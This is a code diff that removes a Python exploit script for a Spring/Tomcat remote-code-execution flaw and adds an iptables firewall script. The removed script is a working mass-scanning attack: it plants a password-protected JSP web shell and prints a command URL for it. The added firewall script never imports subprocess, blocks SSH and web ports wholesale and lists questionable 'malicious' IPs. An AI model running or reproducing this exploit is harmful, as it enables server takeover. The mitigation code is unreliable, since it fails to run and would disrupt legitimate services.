@@ -1,45 +1,36 @@
-#!/usr/bin/env python3
-#coding:utf-8
+malicious_ips = [
+    "192.168.1.100",
+    "203.0.113.50",
+    "185.199.108.153"
+]
 
-import requests
-import argparse
-from urllib.parse import urljoin
+# Ports that are being targeted
+blocked_ports = [22, 80, 443, 3306]  # Example: SSH, HTTP, HTTPS, MySQL
 
-def Exploit(url):
-    headers = {"suffix":"%>//",
-                "c1":"Runtime",
-                "c2":"<%",
-                "DNT":"1",
-                "Content-Type":"application/x-www-form-urlencoded"
+def block_malicious_ips():
+    """Block identified malicious IPs using iptables."""
+    for ip in malicious_ips:
+        subprocess.run(["iptables", "-A", "INPUT", "-s", ip, "-j", "DROP"])
+        subprocess.run(["iptables", "-A", "OUTPUT", "-d", ip, "-j", "DROP"])
+        print(f"Blocked IP: {ip}")
 
-    }
-    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
-    try:
+def block_suspicious_ports():
+    """Block targeted ports to prevent further exploitation."""
+    for port in blocked_ports:
+        subprocess.run(["iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "DROP"])
+        print(f"Blocked Port: {port}")
 
-        go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
-        shellurl = urljoin(url, 'tomcatwar.jsp')
-        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
-        if shellgo.status_code == 200:
-            print(f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")
-    except Exception as e:
-        print(e)
-        pass
+def enable_logging():
+    """Enable logging for further forensic analysis."""
+    subprocess.run(["iptables", "-A", "INPUT", "-m", "limit", "--limit", "10/min", "-j", "LOG", "--log-prefix", "Blocked Traffic: "])
+    print("Logging enabled for suspicious traffic.")
 
+def apply_firewall_rules():
+    """Apply firewall rules to mitigate malware spread."""
+    block_malicious_ips()
+    block_suspicious_ports()
+    enable_logging()
+    print("Firewall mitigation rules applied successfully.")
 
-
-
-def main():
-    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
-    parser.add_argument('--file',help='url file',required=False)
-    parser.add_argument('--url',help='target url',required=False)
-    args = parser.parse_args()
-    if args.url:
-        Exploit(args.url)
-    if args.file:
-        with open (args.file) as f:
-            for i in f.readlines():
-                i = i.strip()
-                Exploit(i)
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    apply_firewall_rules()
